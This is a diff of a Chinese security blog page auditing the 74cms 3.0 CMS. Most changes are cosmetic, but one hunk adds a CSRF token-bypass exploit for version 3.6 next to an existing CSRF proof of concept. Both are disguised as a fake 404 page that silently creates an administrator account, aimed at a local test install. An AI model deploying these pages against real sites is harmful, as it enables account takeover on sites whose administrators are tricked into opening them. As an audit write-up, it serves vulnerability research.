@@ -61,7 +61,7 @@
 <meta property="og:image" content="https://foxgrin.github.io/img/74cms/12.png">
 <meta property="og:image" content="https://foxgrin.github.io/img/74cms/13.png">
 <meta property="og:image" content="https://foxgrin.github.io/img/74cms/14.png">
-<meta property="og:updated_time" content="2019-03-19T12:35:08.986Z">
+<meta property="og:updated_time" content="2019-03-20T12:12:36.692Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="代码审计--74cms3.0">
 <meta name="twitter:description" content="代码审计">
@@ -173,7 +173,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Búsqueda">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -237,7 +237,7 @@
         </div>
         <div class="post-count-custom">
             <i class="icon icon-lg icon-comment-o"></i>
-            阅读本文可能花费您&nbsp;<span class="post-count">10</span>&nbsp;分钟
+            阅读本文可能花费您&nbsp;<span class="post-count">12</span>&nbsp;分钟
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
             <p>记录74cms3.0审计过程以及漏洞分析<a id="more"></a></p>
@@ -382,6 +382,8 @@
 <p>攻击过程：构造一个虚假404页面诱导管理员点击，页面代码如下：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The requested URL /info.php was not found on this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        function  add() &#123;</span></span><br><span class="line"><span class="undefined">            var  xmlhttp = new XMLHttpRequest();</span></span><br><span class="line"><span class="undefined">            var  xmldata = 'admin_name=test2&amp;email=1234%40123.com&amp;password=123456&amp;password1=123456&amp;rank=123&amp;submit3=%CC%ED%BC%D3';</span></span><br><span class="line"><span class="undefined">      		xmlhttp.open('POST','http://127.0.0.1/74cms/admin/admin_users.php?act=add_users_save',true);</span></span><br><span class="line"><span class="undefined">            xmlhttp.setRequestHeader('Content-Type','application/x-www-form-urlencoded');</span></span><br><span class="line"><span class="undefined">            xmlhttp.withCredentials='true'; </span></span><br><span class="line"><span class="undefined">            xmlhttp.send(xmldata);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        add();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>页面利用ajax技术在后台将注册信息提交到<code>admin/admin_users.php</code></p>
+<p>另外在74cms 3.6版本中添加了token机制认证，我们知道token认证机制是取出当前页面提交的token与存放在<strong>Session</strong>中的token值进行比较，相同则通过验证，每当我们刷新一次页面，token值就会发生变化。但是我们仍然可以进行CSRF攻击，办法就是利用iframe框架访问token值的页面，再利用js代码获取token值与信息一起提交即可，附上3.6版本csrf攻击的代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        function  add() &#123;</span></span><br><span class="line"><span class="undefined">            var token = document.getElementById('hack').contentWindow.document.getElementsByName('hiddentoken')[0].value;</span></span><br><span class="line"><span class="undefined">            var  xmlhttp = new XMLHttpRequest();</span></span><br><span class="line"><span class="undefined">            var  xmldata = 'admin_name=test2&amp;email=1234%40123.com&amp;password=123456&amp;password1=123456&amp;rank=123&amp;submit3=%CC%ED%BC%D3&amp;hiddentoken='+token;</span></span><br><span class="line"><span class="undefined">            xmlhttp.open('POST','http://127.0.0.1/74cms3.6/admin/admin_users.php?act=add_users_save',true);</span></span><br><span class="line"><span class="undefined">            xmlhttp.setRequestHeader('Content-Type','application/x-www-form-urlencoded');</span></span><br><span class="line"><span class="undefined">            xmlhttp.withCredentials='true'; </span></span><br><span class="line"><span class="undefined">            xmlhttp.send(xmldata);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/74cms3.6/admin/admin_users.php?act=add_users"</span> <span class="attr">id</span>=<span class="string">'hack'</span> <span class="attr">border</span>=<span class="string">'0'</span> <span class="attr">style</span>=<span class="string">'display:none'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"add()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The requested URL /info.php was not found on this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该cms很多漏洞的利用点都在于未对SQL数组变量<code>$setsqlarr</code>进行过滤以及对后台输入只有转义处理，存在诸多输入过滤不足的情况</p>
 
         </div>
@@ -390,7 +392,7 @@
     <div class="content">
         
 <span class="post-time">
-    Última actualización<time datetime="2019-03-19T12:35:08.986Z" itemprop="dateUpdated">2019-03-19 20:35:08</time>
+    最后更新：<time datetime="2019-03-20T12:12:36.692Z" itemprop="dateUpdated">2019-03-20 20:12:36</time>
 </span>
 
 
@@ -472,7 +474,15 @@
     </div>
 
     
-<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/15210/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：代码审计--emlog6.0
+        </h4>
+      </a>
+    </div>
   
 
   
@@ -534,7 +544,7 @@
         </span>
         <br/>
 
-        <span class="license">Este blog está licenciado bajo una <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">licencia internacional Creative Commons Attribution 4.0</a>.</span>
+        <span class="license"><a  target="_blank" rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">博客内容遵循 知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
     </div>
 </footer>
 
